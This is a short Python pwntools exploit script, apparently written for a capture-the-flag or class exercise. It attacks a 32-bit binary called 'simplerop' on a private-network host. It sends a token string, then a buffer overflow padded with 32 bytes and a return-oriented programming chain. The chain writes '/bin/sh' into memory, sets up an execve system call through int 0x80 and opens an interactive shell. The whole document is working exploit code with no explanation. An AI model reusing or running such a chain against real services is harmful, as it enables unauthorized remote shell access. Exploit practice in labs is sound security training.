from pwn import *  
#p = process('./simplerop')
p = remote('10.214.10.18',11863)  
#elf = ELF('./baby_rop')  
payload = '3160104501.6880c7b179fd087c3c9a75917a028647'
p.sendline(payload)
pop_edx_ecx_ebx = 0x0806e850  
pop_eax = 0x080bae06  
pop_edx = 0x0806e82a  
int_80 = 0x080493e1  
#gadget = 0x080707b9 # mov word ptr [edx],eax  
#bss = elf.bss()  
#read_plt = elf.symbols['read']  
mov_ret=0x0809a15d
data_addr=0x080ea060 
  
  
payload = 'a'*32 + p32(pop_edx) +p32(data_addr)+ p32(pop_eax) +"/bin"+ p32(mov_ret)  
payload +=  p32(pop_edx) + p32(data_addr+4) + p32(pop_eax) + "/sh\x00" + p32(mov_ret)  
payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(data_addr) 
payload += p32(pop_eax) + p32(0xb)  
payload += p32(int_80)  

p.recvuntil(":")  
p.sendline(payload)  
p.interactive()  
